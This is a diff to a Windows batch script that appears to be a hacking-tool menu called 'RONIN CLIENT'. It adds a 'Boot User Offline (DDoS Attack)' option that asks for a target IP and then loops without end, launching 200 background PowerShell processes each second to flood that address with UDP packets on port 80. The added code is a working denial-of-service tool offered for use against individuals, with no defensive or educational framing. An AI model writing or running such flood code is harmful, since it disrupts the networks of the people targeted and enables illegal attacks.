@@ -91,14 +91,28 @@ goto spam
 cls
 echo RONIN CLIENT ON TOP(MADE BY THATGUIYRONIN)
 echo.
-echo 1. Back to Main Menu
+echo 1. Boot User Offline (DDoS Attack)
+echo 2. Back to Main Menu
 echo.
 set /p windows_exploit_choice=Choose an option:
 
-if "%windows_exploit_choice%"=="1" goto main_menu
+if "%windows_exploit_choice%"=="1" goto ddos_attack
+if "%windows_exploit_choice%"=="2" goto main_menu
 echo Invalid option. Please choose a valid option.
 pause
 goto windows_exploits
+
+:ddos_attack
+cls
+set /p target_ip=Enter the target IP address:
+set /a port=80
+
+:spam_target
+for /L %%i in (1,1,200) do (
+    start /b powershell -Command "New-Object System.Net.Sockets.UdpClient; $client = New-Object System.Net.Sockets.UdpClient; $client.Connect('%target_ip%', %port%); $client.Send([System.Text.Encoding]::ASCII.GetBytes('A' * 1024)); $client.Close();"
+)
+timeout /t 1 >nul
+goto spam_target
 
 :system_info
 cls
